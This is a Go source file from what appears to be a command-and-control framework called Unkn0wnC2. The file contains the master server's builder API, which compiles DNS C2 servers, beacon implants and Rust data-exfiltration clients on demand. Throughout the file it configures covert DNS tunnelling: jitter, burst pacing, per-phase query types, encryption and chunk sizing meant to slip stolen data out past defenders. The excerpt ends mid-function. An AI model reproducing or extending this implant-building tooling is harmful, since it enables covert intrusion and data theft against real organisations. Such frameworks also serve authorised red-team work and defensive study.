// Package main implements the builder functionality for Unkn0wnC2 Master Server.
// This file handles on-demand compilation of DNS servers, clients, and stagers.
package main

import (
	"bytes"
	"compress/gzip"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
)

const (
	buildsDir        = "/opt/unkn0wnc2/builds" // Directory to store compiled binaries
	exfilBuildJobTTL = 30 * time.Minute
)

var (
	// buildMutex prevents concurrent builds from interfering with each other
	buildMutex sync.Mutex
)

// ExfilBuildJob tracks asynchronous exfil client builds so the UI can poll for status.
type ExfilBuildJob struct {
	ID             string         `json:"id"`
	Status         string         `json:"status"`
	Message        string         `json:"message"`
	Error          string         `json:"error,omitempty"`
	Artifact       *BuildArtifact `json:"artifact,omitempty"`
	CreatedAt      time.Time      `json:"created_at"`
	UpdatedAt      time.Time      `json:"updated_at"`
	CompletedAt    *time.Time     `json:"completed_at,omitempty"`
	Platform       string         `json:"platform"`
	Architecture   string         `json:"architecture"`
	ChunkBytes     int            `json:"chunk_bytes"`
	JitterMinMs    int            `json:"jitter_min_ms"`
	JitterMaxMs    int            `json:"jitter_max_ms"`
	ChunksPerBurst int            `json:"chunks_per_burst"`
	BurstPauseMs   int            `json:"burst_pause_ms"`
	ServerIP       string         `json:"server_ip"`
	Domains        []string       `json:"domains"`
	Resolvers      []string       `json:"resolvers"`
}

func cloneExfilBuildJob(job *ExfilBuildJob) *ExfilBuildJob {
	if job == nil {
		return nil
	}
	clone := *job
	if len(job.Domains) > 0 {
		clone.Domains = append([]string(nil), job.Domains...)
	}
	if len(job.Resolvers) > 0 {
		clone.Resolvers = append([]string(nil), job.Resolvers...)
	}
	if job.Artifact != nil {
		artifactCopy := *job.Artifact
		clone.Artifact = &artifactCopy
	}
	return &clone
}

func (api *APIServer) persistExfilBuildJob(job *ExfilBuildJob, create bool) {
	if api == nil || api.db == nil || job == nil {
		return
	}
	var err error
	if create {
		err = api.db.InsertExfilBuildJob(job)
	} else {
		err = api.db.UpdateExfilBuildJob(job)
	}
	if err != nil {
		fmt.Printf("[Builder] Failed to persist exfil build job %s: %v\n", job.ID, err)
	}
}

func (api *APIServer) createExfilBuildJob(req *ExfilClientBuildRequest) *ExfilBuildJob {
	jobID := fmt.Sprintf("exfil_job_%d", time.Now().UnixNano())
	platform := ""
	architecture := ""
	chunkBytes := 0
	jitterMin := 0
	jitterMax := 0
	chunksPerBurst := 0
	burstPause := 0
	var domains, resolvers []string
	serverIP := ""
	if req != nil {
		platform = strings.ToLower(strings.TrimSpace(req.Platform))
		architecture = strings.ToLower(strings.TrimSpace(req.Architecture))
		chunkBytes = req.ChunkBytes
		jitterMin = req.JitterMinMs
		jitterMax = req.JitterMaxMs
		chunksPerBurst = req.ChunksPerBurst
		burstPause = req.BurstPauseMs
		domains = append([]string(nil), filterEmpty(req.Domains)...)
		resolvers = append([]string(nil), filterEmpty(req.Resolvers)...)
		serverIP = req.ServerIP
	}
	job := &ExfilBuildJob{
		ID:             jobID,
		Status:         "queued",
		Message:        "Waiting for build worker",
		CreatedAt:      time.Now(),
		UpdatedAt:      time.Now(),
		Platform:       platform,
		Architecture:   architecture,
		ChunkBytes:     chunkBytes,
		JitterMinMs:    jitterMin,
		JitterMaxMs:    jitterMax,
		ChunksPerBurst: chunksPerBurst,
		BurstPauseMs:   burstPause,
		ServerIP:       serverIP,
		Domains:        domains,
		Resolvers:      resolvers,
	}
	api.exfilJobsMu.Lock()
	api.exfilBuildJobs[jobID] = job
	api.exfilJobsMu.Unlock()
	api.persistExfilBuildJob(cloneExfilBuildJob(job), true)
	return job
}

func (api *APIServer) updateExfilBuildJob(id string, update func(job *ExfilBuildJob)) {
	api.exfilJobsMu.Lock()
	job, ok := api.exfilBuildJobs[id]
	if !ok {
		api.exfilJobsMu.Unlock()
		return
	}
	update(job)
	job.UpdatedAt = time.Now()
	snapshot := cloneExfilBuildJob(job)
	api.exfilJobsMu.Unlock()
	api.persistExfilBuildJob(snapshot, false)
}

func (api *APIServer) getExfilBuildJob(id string) (*ExfilBuildJob, bool) {
	api.exfilJobsMu.RLock()
	if job, ok := api.exfilBuildJobs[id]; ok {
		api.exfilJobsMu.RUnlock()
		return cloneExfilBuildJob(job), true
	}
	api.exfilJobsMu.RUnlock()
	if api.db == nil {
		return nil, false
	}
	job, err := api.db.GetExfilBuildJob(id)
	if err != nil || job == nil {
		return nil, false
	}
	return job, true
}

func (api *APIServer) completeExfilBuildJob(id, message string, artifact *BuildArtifact) {
	completed := time.Now()
	api.updateExfilBuildJob(id, func(job *ExfilBuildJob) {
		job.Status = "completed"
		job.Message = message
		job.Artifact = artifact
		job.Error = ""
		job.CompletedAt = &completed
	})
	api.scheduleExfilBuildCleanup(id)
}

func (api *APIServer) failExfilBuildJob(id string, err error) {
	completed := time.Now()
	msg := "Exfil client build failed"
	if err != nil {
		msg = err.Error()
	}
	api.updateExfilBuildJob(id, func(job *ExfilBuildJob) {
		job.Status = "failed"
		job.Message = msg
		job.Error = msg
		job.CompletedAt = &completed
	})
	api.scheduleExfilBuildCleanup(id)
	if err != nil {
		fmt.Printf("[Builder] Exfil build %s failed: %v\n", id, err)
	}
}

func (api *APIServer) scheduleExfilBuildCleanup(id string) {
	if api == nil {
		return
	}
	time.AfterFunc(exfilBuildJobTTL, func() {
		api.exfilJobsMu.Lock()
		delete(api.exfilBuildJobs, id)
		api.exfilJobsMu.Unlock()
	})
}

func resolveBinary(binName string, hints []string) (string, error) {
	for _, candidate := range hints {
		if candidate == "" {
			continue
		}
		if info, err := os.Stat(candidate); err == nil && !info.IsDir() {
			return candidate, nil
		}
	}
	path, err := exec.LookPath(binName)
	if err != nil {
		return "", fmt.Errorf("%s not found in PATH. Install Rust toolchain via https://rustup.rs and ensure %s is available", binName, binName)
	}
	return path, nil
}

func gatherBinaryHints(binName string) []string {
	seen := make(map[string]struct{})
	var hints []string
	add := func(path string) {
		if path == "" {
			return
		}
		if _, exists := seen[path]; exists {
			return
		}
		seen[path] = struct{}{}
		hints = append(hints, path)
	}

	if cargoHome := os.Getenv("CARGO_HOME"); cargoHome != "" {
		add(filepath.Join(cargoHome, "bin", binName))
	}

	if home := os.Getenv("HOME"); home != "" {
		add(filepath.Join(home, ".cargo", "bin", binName))
	}

	if sudoUser := os.Getenv("SUDO_USER"); sudoUser != "" {
		add(filepath.Join("/home", sudoUser, ".cargo", "bin", binName))
	}

	add(filepath.Join("/root", ".cargo", "bin", binName))
	return hints
}

func resolveCargoBinary() (string, error) {
	return resolveBinary("cargo", gatherBinaryHints("cargo"))
}

func resolveRustupBinary() (string, error) {
	return resolveBinary("rustup", gatherBinaryHints("rustup"))
}

// Builder request structures
type DNSServerBuildRequest struct {
	Domain        string `json:"domain"`
	NS1           string `json:"ns1"`
	NS2           string `json:"ns2"`
	UpstreamDNS   string `json:"upstream_dns"`
	ServerAddress string `json:"server_address"`
	EncryptionKey string `json:"encryption_key"`
	ForwardDNS    *bool  `json:"forward_dns"` // nil = default (true), explicit false disables forwarding
}

// PhaseConfigRequest holds per-phase malleable settings from the builder UI
type PhaseConfigRequest struct {
	QueryType     string `json:"query_type"`      // "TXT" or "A"
	Encrypted     *bool  `json:"encrypted"`        // nil = use global default
	MaxPayload    int    `json:"max_payload"`      // 0 = auto
	PayloadFormat string `json:"payload_format"`
	ARecordACKIP  string `json:"a_record_ack_ip"`
}

// PollPhaseConfigRequest extends PhaseConfigRequest with poll-specific fields
type PollPhaseConfigRequest struct {
	PhaseConfigRequest
	ARecordTaskIP   string `json:"a_record_task_ip"`
	TxtFollowUpSecs int    `json:"txt_follow_up_secs"`
}

type ClientBuildRequest struct {
	DNSDomains          []string `json:"dns_domains"`
	Platform            string   `json:"platform"`
	Architecture        string   `json:"architecture"`
	SleepMin            int      `json:"sleep_min"`
	SleepMax            int      `json:"sleep_max"`
	ExfilJitterMinMs    int      `json:"exfil_jitter_min_ms"`
	ExfilJitterMaxMs    int      `json:"exfil_jitter_max_ms"`
	ExfilChunksPerBurst int      `json:"exfil_chunks_per_burst"`
	ExfilBurstPauseMs   int      `json:"exfil_burst_pause_ms"`
	StaticLink          bool     `json:"static_link"`
	Resolver            string   `json:"resolver"`            // Optional: DNS resolver IP:port (empty = system resolver)
	MaxSubdomainLength  int      `json:"max_subdomain_length"` // Legacy global (0 = default)
	PayloadFormat       string   `json:"payload_format"`       // Legacy global
	BeaconName          string   `json:"beacon_name"`
	Encrypted           *bool    `json:"encrypted"` // Legacy global: nil or true = AES-GCM; false = plain base36
	StagedRegistration  bool     `json:"staged_registration"`

	// Per-phase malleable configuration
	RegistrationPhase *PhaseConfigRequest     `json:"registration_phase,omitempty"`
	PollPhase         *PollPhaseConfigRequest  `json:"poll_phase,omitempty"`
	DataExfilPhase    *PhaseConfigRequest     `json:"data_exfil_phase,omitempty"`
}

type StagerBuildRequest struct {
	ClientBinaryID string `json:"client_binary_id"` // ID of pre-built client to use
	Domain         string `json:"domain"`           // Primary DNS domain (for single-server mode)
	Platform       string `json:"platform"`
	Architecture   string `json:"architecture"`
	PayloadURL     string `json:"payload_url"`
	JitterMinMs    int    `json:"jitter_min_ms"`
	JitterMaxMs    int    `json:"jitter_max_ms"`
	ChunksPerBurst int    `json:"chunks_per_burst"`
	BurstPauseMs   int    `json:"burst_pause_ms"`
	FallbackDNS    string `json:"fallback_dns"`
	StaticLink     bool   `json:"static_link"`
	Resolver       string `json:"resolver"` // Optional: DNS resolver IP (empty = system resolver)
}

type ExfilClientBuildRequest struct {
	Domains            []string `json:"domains"`
	Resolvers          []string `json:"resolvers"`
	ServerIP           string   `json:"server_ip"`
	ChunkBytes         int      `json:"chunk_bytes"`
	JitterMinMs        int      `json:"jitter_min_ms"`
	JitterMaxMs        int      `json:"jitter_max_ms"`
	ChunksPerBurst     int      `json:"chunks_per_burst"`
	BurstPauseMs       int      `json:"burst_pause_ms"`
	Platform           string   `json:"platform"`
	Architecture       string   `json:"architecture"`
	StaticLink         bool     `json:"static_link"`
	UseTxtRecords      bool     `json:"use_txt_records"`
	MaxSubdomainLength int      `json:"max_subdomain_length"` // Max subdomain chars (0 = default)
	Encrypted          *bool    `json:"encrypted"`            // nil or true = AES-GCM; false = plain base36
}

// resolvePhaseConfigReq extracts per-phase values from a request, falling back to global encrypted default.
func resolvePhaseConfigReq(phase *PhaseConfigRequest, globalEncrypted bool) (queryType string, enc bool, maxPayload int, payloadFmt string, ackIP string) {
	queryType = "TXT"
	enc = globalEncrypted
	if phase != nil {
		if phase.QueryType != "" {
			queryType = phase.QueryType
		}
		if phase.Encrypted != nil {
			enc = *phase.Encrypted
		}
		maxPayload = phase.MaxPayload
		payloadFmt = phase.PayloadFormat
		ackIP = phase.ARecordACKIP
	}
	return
}

// Web UI handler for builder page
func (api *APIServer) handleBuilderPage(w http.ResponseWriter, r *http.Request) {
	serveNoCache(w, r, filepath.Join(api.config.WebRoot, "builder.html"))
}

// handleBuildDNSServer builds a DNS server binary with provided configuration
func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Request) {
	// Acquire build lock to prevent concurrent builds from interfering
	buildMutex.Lock()
	defer buildMutex.Unlock()

	var req DNSServerBuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate required fields
	if req.Domain == "" {
		api.sendError(w, http.StatusBadRequest, "domain is required")
		return
	}
	if !isValidDomain(req.Domain) {
		api.sendError(w, http.StatusBadRequest, "invalid domain format")
		return
	}

	if req.ServerAddress == "" {
		api.sendError(w, http.StatusBadRequest, "server address is required for A records")
		return
	}
	if net.ParseIP(req.ServerAddress) == nil {
		api.sendError(w, http.StatusBadRequest, "server address must be a valid IP")
		return
	}

	// Auto-generate NS1 and NS2 from domain if not provided
	if req.NS1 == "" {
		req.NS1 = "ns1." + req.Domain
	}
	if req.NS2 == "" {
		req.NS2 = "ns2." + req.Domain
	}

	if !isValidDomain(req.NS1) || !isValidDomain(req.NS2) {
		api.sendError(w, http.StatusBadRequest, "invalid NS record format")
		return
	}

	if req.UpstreamDNS != "" {
		host, _, err := net.SplitHostPort(req.UpstreamDNS)
		if err != nil {
			if net.ParseIP(req.UpstreamDNS) == nil {
				api.sendError(w, http.StatusBadRequest, "upstream_dns must be a valid IP or IP:port")
				return
			}
		} else if net.ParseIP(host) == nil {
			api.sendError(w, http.StatusBadRequest, "upstream_dns host must be a valid IP")
			return
		}
	}

	// Use Master's global encryption key for all C2 communications
	// This ensures all DNS servers and clients use the same key
	req.EncryptionKey = api.config.EncryptionKey
	if req.EncryptionKey == "" {
		api.sendError(w, http.StatusInternalServerError, "encryption key not configured in Master config")
		return
	}

	// Generate API key for this DNS server
	apiKeyBytes := make([]byte, 16)
	if _, err := rand.Read(apiKeyBytes); err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to generate secure API key")
		return
	}
	apiKey := hex.EncodeToString(apiKeyBytes)

	// NOTE: Don't register in DB until build succeeds - see below
	serverID := fmt.Sprintf("dns-%d", time.Now().Unix())

	// Get master server URL from config
	// If BindAddr is 0.0.0.0, we need the actual hostname/IP
	// For now, use the request's Host header or fallback to BindAddr
	masterHost := api.config.BindAddr
	if masterHost == "0.0.0.0" || masterHost == "" {
		// Try to get from request
		if r.Host != "" {
			// Strip port if present
			if colonIdx := strings.Index(r.Host, ":"); colonIdx > 0 {
				masterHost = r.Host[:colonIdx]
			} else {
				masterHost = r.Host
			}
		} else {
			// Fallback - this might not work but it's better than 0.0.0.0
			masterHost = "localhost"
		}
	}
	masterURL := fmt.Sprintf("https://%s:%d", masterHost, api.config.BindPort)

	// Build the server
	binaryPath, err := api.buildDNSServer(req, masterURL, apiKey, serverID)
	if err != nil {
		logPath := api.saveBuildLog("dns-server", serverID, []byte(err.Error()), err)
		errMsg := fmt.Sprintf("build failed: %v", err)
		if logPath != "" {
			errMsg += fmt.Sprintf("\nBuild log saved to: %s", relativeBuildPath(logPath))
		}
		api.sendError(w, http.StatusInternalServerError, errMsg)
		return
	}
	// Clean up build directory (which contains the binary) after we're done with everything
	buildDir := filepath.Dir(binaryPath)
	defer os.RemoveAll(buildDir)

	fmt.Printf("DNS server build completed: %s\n", binaryPath)

	// Register DNS server in database ONLY after successful build
	err = api.db.RegisterDNSServer(serverID, req.Domain, req.ServerAddress, apiKey)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to register DNS server: %v", err))
		return
	}

	fmt.Printf("DNS server registered in database: %s\n", serverID)

	// Save binary to builds directory
	filename := fmt.Sprintf("dns-server-%s-%d", req.Domain, time.Now().Unix())
	savedPath, err := api.saveBuild(binaryPath, filename, "dns-server", nil)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to save build: %v", err))
		return
	}
	fmt.Printf("Build saved to: %s\n", savedPath)

	artifact, err := newBuildArtifact("dns-server", filename, savedPath)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to prepare build metadata")
		return
	}

	api.sendSuccess(w, "DNS server build saved", artifact)
}

// handleBuildClient builds a client binary with provided configuration
func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) {
	// Acquire build lock to prevent concurrent builds from interfering
	buildMutex.Lock()
	defer buildMutex.Unlock()

	var req ClientBuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate
	if len(req.DNSDomains) == 0 {
		api.sendError(w, http.StatusBadRequest, "at least one DNS domain is required")
		return
	}

	// Log domains for debugging Shadow Mesh configuration
	fmt.Printf("[Builder] Building client with %d DNS domains: %v\n", len(req.DNSDomains), req.DNSDomains)

	// Validate platform
	if req.Platform == "" {
		api.sendError(w, http.StatusBadRequest, "platform is required")
		return
	}

	// Default to amd64 if architecture not specified
	if req.Architecture == "" {
		req.Architecture = "amd64"
	}

	// Validate architecture
	validArchs := map[string]bool{"amd64": true, "386": true, "arm": true, "arm64": true, "armv7l": true}
	if !validArchs[req.Architecture] {
		api.sendError(w, http.StatusBadRequest, "invalid architecture: must be amd64, 386, arm, arm64, or armv7l")
		return
	}

	// Validate timing values are non-negative
	if req.SleepMin < 1 || req.SleepMax < 1 {
		api.sendError(w, http.StatusBadRequest, "sleep min and max must be >= 1")
		return
	}
	if req.SleepMin > req.SleepMax {
		api.sendError(w, http.StatusBadRequest, "sleep min must be <= sleep max")
		return
	}
	if req.ExfilJitterMinMs < 0 || req.ExfilJitterMaxMs < 0 || req.ExfilBurstPauseMs < 0 {
		api.sendError(w, http.StatusBadRequest, "exfil timing values cannot be negative")
		return
	}
	if req.ExfilChunksPerBurst < 1 {
		req.ExfilChunksPerBurst = 1
	}
	if req.MaxSubdomainLength < 0 {
		req.MaxSubdomainLength = 0
	}

	// Validate MaxSubdomainLength against DNS constraints
	encrypted := req.Encrypted == nil || *req.Encrypted
	if req.MaxSubdomainLength > 0 {
		// Minimum usable subdomain length: must fit frame overhead + at least 1 byte of data.
		// encoded = (raw + AES_overhead) * 1.6, plus label dots every 62 chars.
		// Encrypted:   (35 frame + 1 data + 28 AES) * 1.6 ≈ 103 chars + label dots
		// Unencrypted: (35 frame + 1 data) * 1.6         ≈  58 chars + label dots
		minSubLen := 58
		if encrypted {
			minSubLen = 104
		}
		if req.MaxSubdomainLength < minSubLen {
			api.sendError(w, http.StatusBadRequest, fmt.Sprintf(
				"max_subdomain_length %d is too small — minimum %d chars required to carry any data (%s). Set to 0 to use the full DNS budget",
				req.MaxSubdomainLength, minSubLen, map[bool]string{true: "encrypted", false: "unencrypted"}[encrypted]))
			return
		}

		// Ensure subdomain + domain fits within 253-char FQDN limit
		longest := longestDomainLength(req.DNSDomains)
		// FQDN = subdomain_labels.timestamp_label.domain — need room for the dot separators
		if req.MaxSubdomainLength+1+6+1+longest > dnsMaxName {
			maxAllowed := dnsMaxName - longest - 8 // 8 = dot + 5-char timestamp label + dot + safety
			api.sendError(w, http.StatusBadRequest, fmt.Sprintf(
				"max_subdomain_length %d + domain '%d chars' exceeds 253-char DNS limit. Maximum for your domains: %d",
				req.MaxSubdomainLength, longest, maxAllowed))
			return
		}
	}

	// Validate PayloadFormat (if provided) against the configured domains
	if req.PayloadFormat != "" {
		if err := validatePayloadFormat(req.PayloadFormat, req.DNSDomains); err != nil {
			api.sendError(w, http.StatusBadRequest, fmt.Sprintf("invalid payload_format: %v", err))
			return
		}
	}

	// Generate short build ID with collision retry and backoff
	var buildID string
	for attempt := 0; attempt < 10; attempt++ {
		candidate, err := generateBuildID()
		if err != nil {
			api.sendError(w, http.StatusInternalServerError, "failed to generate build ID")
			return
		}
		if existing, _ := api.db.GetBuildConfigByBuildID(candidate); existing == nil {
			buildID = candidate
			break
		}
		time.Sleep(time.Duration(1<<attempt) * time.Millisecond)
	}
	if buildID == "" {
		api.sendError(w, http.StatusInternalServerError, "failed to generate unique build ID after 10 attempts")
		return
	}
	fmt.Printf("[Builder] Generated build ID: %s\n", buildID)

	binaryPath, err := buildClient(req, api.config.SourceDir, api.config.EncryptionKey, buildID)
	if err != nil {
		logPath := api.saveBuildLog("client", buildID, []byte(err.Error()), err)
		errMsg := fmt.Sprintf("build failed: %v", err)
		if logPath != "" {
			errMsg += fmt.Sprintf("\nBuild log saved to: %s", relativeBuildPath(logPath))
		}
		api.sendError(w, http.StatusInternalServerError, errMsg)
		return
	}
	// Clean up build directory after we're done
	buildDir := filepath.Dir(binaryPath)
	defer os.RemoveAll(buildDir)

	// Save binary to builds directory
	ext := ""
	if req.Platform == "windows" {
		ext = ".exe"
	}
	filename := fmt.Sprintf("beacon-%s-%s-%s-%d%s", req.Platform, req.Architecture, buildID, time.Now().Unix(), ext)
	metadata := &BuildMetadata{
		Platform:     req.Platform,
		Architecture: req.Architecture,
		Domains:      append([]string(nil), req.DNSDomains...),
		BuildID:      buildID,
		Timing: &BuildTimingMetadata{
			SleepMinSec:    req.SleepMin,
			SleepMaxSec:    req.SleepMax,
			JitterMinMs:    req.ExfilJitterMinMs,
			JitterMaxMs:    req.ExfilJitterMaxMs,
			ChunksPerBurst: req.ExfilChunksPerBurst,
			BurstPauseMs:   req.ExfilBurstPauseMs,
		},
	}
	savedPath, err := api.saveBuild(binaryPath, filename, "client", metadata)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to save build: %v", err))
		return
	}
	fmt.Printf("Build saved to: %s\n", savedPath)

	// Resolve per-phase config for build config JSON storage
	regQT, regEnc, regMaxPayload, regPayloadFmt, regACKIP := resolvePhaseConfigReq(req.RegistrationPhase, encrypted)
	var pollQT string
	var pollEnc bool
	var pollMaxPayload int
	var pollPayloadFmt, pollACKIP, pollTaskIP string
	var txtFollowUp int
	if req.PollPhase != nil {
		pollQT, pollEnc, pollMaxPayload, pollPayloadFmt, pollACKIP = resolvePhaseConfigReq(&req.PollPhase.PhaseConfigRequest, encrypted)
		pollTaskIP = req.PollPhase.ARecordTaskIP
		txtFollowUp = req.PollPhase.TxtFollowUpSecs
	} else {
		pollQT, pollEnc, pollMaxPayload, pollPayloadFmt, pollACKIP = resolvePhaseConfigReq(nil, encrypted)
	}
	exfilQT, exfilEnc, exfilMaxPayload, exfilPayloadFmt, exfilACKIP := resolvePhaseConfigReq(req.DataExfilPhase, encrypted)

	buildConfigMap := map[string]interface{}{
		"sleep_min":            req.SleepMin,
		"sleep_max":            req.SleepMax,
		"exfil_jitter_min_ms":  req.ExfilJitterMinMs,
		"exfil_jitter_max_ms":  req.ExfilJitterMaxMs,
		"exfil_chunks_per_burst": req.ExfilChunksPerBurst,
		"exfil_burst_pause_ms":   req.ExfilBurstPauseMs,
		"max_subdomain_length":   req.MaxSubdomainLength,
		"payload_format":         req.PayloadFormat,
		"beacon_name":            req.BeaconName,
		"encrypted":              encrypted,
		"resolver":               req.Resolver,
		"static_link":            req.StaticLink,
		"staged_registration":    req.StagedRegistration,
		"registration_phase": map[string]interface{}{
			"query_type":      regQT,
			"encrypted":       regEnc,
			"max_payload":     regMaxPayload,
			"payload_format":  regPayloadFmt,
			"a_record_ack_ip": regACKIP,
		},
		"poll_phase": map[string]interface{}{
			"query_type":       pollQT,
			"encrypted":        pollEnc,
			"max_payload":      pollMaxPayload,
			"payload_format":   pollPayloadFmt,
			"a_record_ack_ip":  pollACKIP,
			"a_record_task_ip": pollTaskIP,
			"txt_follow_up_secs": txtFollowUp,
		},
		"data_exfil_phase": map[string]interface{}{
			"query_type":      exfilQT,
			"encrypted":       exfilEnc,
			"max_payload":     exfilMaxPayload,
			"payload_format":  exfilPayloadFmt,
			"a_record_ack_ip": exfilACKIP,
		},
	}
	buildConfigJSON, _ := json.Marshal(buildConfigMap)

	if err := api.storeClientBinaryForStager(binaryPath, filename, req, savedPath, buildID, string(buildConfigJSON)); err != nil {
		fmt.Printf("[Builder] ERROR: Failed to store client binary in database: %v\n", err)
	}

	artifact, err := newBuildArtifact("client", filename, savedPath)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to prepare build metadata")
		return
	}
	artifact.BuildID = buildID

	msg := "Client build saved"
	var warnings []string
	if req.Encrypted != nil && !*req.Encrypted {
		warnings = append(warnings, "encryption disabled — all beacon traffic is plaintext base36")
	}
	if req.PayloadFormat != "" {
		// CHK-only threshold: xSlots*5/8 - overhead < 1
		// encrypted: overhead=63 → min 104 slots; unencrypted: overhead=35 → min 58 slots
		overhead := 63
		if req.Encrypted != nil && !*req.Encrypted {
			overhead = 35
		}
		if strings.Count(req.PayloadFormat, "X")*5/8-overhead < 1 {
			warnings = append(warnings, "payload_format has too few X slots to carry data chunks — format applies to CHK beacons only; result exfil uses default encoding")
		}
	}
	if len(warnings) > 0 {
		msg = "Client build saved (WARNING: " + strings.Join(warnings, "; ") + ")"
	}

	api.sendSuccess(w, msg, artifact)
}


// handleBuildExfilClient builds the dedicated Rust exfil client with embedded configuration
func (api *APIServer) handleBuildExfilClient(w http.ResponseWriter, r *http.Request) {
	var req ExfilClientBuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	job := api.createExfilBuildJob(&req)
	api.sendSuccess(w, "Exfil client build queued", job)

	go api.executeExfilBuildJob(job.ID, req)
}

func (api *APIServer) executeExfilBuildJob(jobID string, req ExfilClientBuildRequest) {
	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
		job.Status = "running"
		job.Message = "Validating request"
	})

	// Normalize platform/architecture
	req.Platform = strings.ToLower(strings.TrimSpace(req.Platform))
	if req.Platform == "" {
		req.Platform = "linux"
	}
	req.Architecture = strings.ToLower(strings.TrimSpace(req.Architecture))
	if req.Architecture == "" {
		req.Architecture = "amd64"
	}

	// Always derive DNS configuration from the database to prevent manual overrides
	cachedDNSServers, dnsErr := api.db.GetDNSServers()
	if dnsErr != nil {
		api.failExfilBuildJob(jobID, fmt.Errorf("failed to query DNS servers: %w", dnsErr))
		return
	}

	req.Domains = collectActiveDomains(cachedDNSServers)
	if len(req.Domains) == 0 {
		api.failExfilBuildJob(jobID, fmt.Errorf("no active DNS servers available - build at least one before generating an exfil client"))
		return
	}

	req.ServerIP = selectServerAddress(cachedDNSServers)
	if req.ServerIP == "" {
		api.failExfilBuildJob(jobID, fmt.Errorf("no DNS server addresses recorded - rebuild a DNS server with a server address before generating an exfil client"))
		return
	}

	// If user specified resolvers, use them; otherwise rely on system resolvers
	// Empty resolvers array means the implant will use system DNS (normal recursion paths)
	if len(filterEmpty(req.Resolvers)) == 0 {
		req.Resolvers = nil
	}

	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
		job.Domains = append([]string(nil), req.Domains...)
		job.Resolvers = append([]string(nil), filterEmpty(req.Resolvers)...)
		job.ServerIP = req.ServerIP
	})

	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
		job.Message = "Calculating DNS chunk constraints"
	})

	beforeChunk, domainLimit := clampExfilChunkBytes(&req)
	if beforeChunk > 0 && beforeChunk != req.ChunkBytes {
		if domainLimit > 0 && req.ChunkBytes == domainLimit && beforeChunk > domainLimit {
			fmt.Printf("[Builder] Requested chunk size %d bytes exceeded DNS limit (%d bytes). Clamped to %d bytes.\n", beforeChunk, domainLimit, req.ChunkBytes)
		} else {
			fmt.Printf("[Builder] Normalized chunk size from %d to %d bytes.\n", beforeChunk, req.ChunkBytes)
		}
	} else if domainLimit == 0 {
		fmt.Printf("[Builder] Warning: unable to compute DNS chunk limit for current domains. Retaining %d-byte chunks.\n", req.ChunkBytes)
	}

	// Apply remaining sensible defaults/constraints
	if req.JitterMinMs <= 0 {
		req.JitterMinMs = 1500
	}
	if req.JitterMaxMs <= 0 {
		req.JitterMaxMs = 4000
	}
	if req.JitterMaxMs < req.JitterMinMs {
		req.JitterMaxMs = req.JitterMinMs + 500
	}
	if req.ChunksPerBurst <= 0 {
		req.ChunksPerBurst = 8
	}
	if req.BurstPauseMs <= 0 {
		req.BurstPauseMs = 15000
	}

	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
		job.Platform = req.Platform
		job.Architecture = req.Architecture
		job.ChunkBytes = req.ChunkBytes
		job.JitterMinMs = req.JitterMinMs
		job.JitterMaxMs = req.JitterMaxMs
		job.ChunksPerBurst = req.ChunksPerBurst
		job.BurstPauseMs = req.BurstPauseMs
	})

	if api.config.EncryptionKey == "" {
		api.failExfilBuildJob(jobID, fmt.Errorf("master encryption key is not configured"))
		return
	}

	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
		job.Message = "Resolving Rust target toolchain"
	})

	targetCfg, err := resolveRustTargetConfig(req.Platform, req.Architecture, req.StaticLink)
	if err != nil {
		api.failExfilBuildJob(jobID, err)
		return
	}

	if err := ensureExfilBuildDependencies(targetCfg); err != nil {
		api.failExfilBuildJob(jobID, err)
		return
	}

	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
		job.Message = "Compiling exfil client"
	})

	buildMutex.Lock()
	defer buildMutex.Unlock()

	serverIPs := collectServerAddresses(cachedDNSServers)
	if len(serverIPs) == 0 && req.ServerIP != "" {
		serverIPs = []string{req.ServerIP}
	}

	binaryPath, err := buildExfilClient(req, api.config.SourceDir, api.config.EncryptionKey, targetCfg, serverIPs)
	if err != nil {
		api.saveBuildLog("exfil", jobID, []byte(err.Error()), err)
		api.failExfilBuildJob(jobID, fmt.Errorf("build failed: %w", err))
		return
	}
	buildDir := filepath.Dir(binaryPath)
	defer os.RemoveAll(buildDir)

	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
		job.Message = "Persisting build artifact"
	})

	// Save binary copy for operators
	var ext string
	if req.Platform == "windows" {
		ext = ".exe"
	}
	filename := fmt.Sprintf("exfil-%s-%s-%d%s", req.Platform, req.Architecture, time.Now().Unix(), ext)
	metadata := &BuildMetadata{
		Platform:     req.Platform,
		Architecture: req.Architecture,
		Domains:      append([]string(nil), req.Domains...),
		Timing: &BuildTimingMetadata{
			ChunkBytes:     req.ChunkBytes,
			JitterMinMs:    req.JitterMinMs,
			JitterMaxMs:    req.JitterMaxMs,
			ChunksPerBurst: req.ChunksPerBurst,
			BurstPauseMs:   req.BurstPauseMs,
		},
	}
	savedPath, err := api.saveBuild(binaryPath, filename, "exfil", metadata)
	if err != nil {
		api.failExfilBuildJob(jobID, fmt.Errorf("failed to save exfil build: %w", err))
		return
	}
	fmt.Printf("[Builder] Exfil build saved to: %s\n", savedPath)
	artifact, err := newBuildArtifact("exfil", filename, savedPath)
	if err != nil {
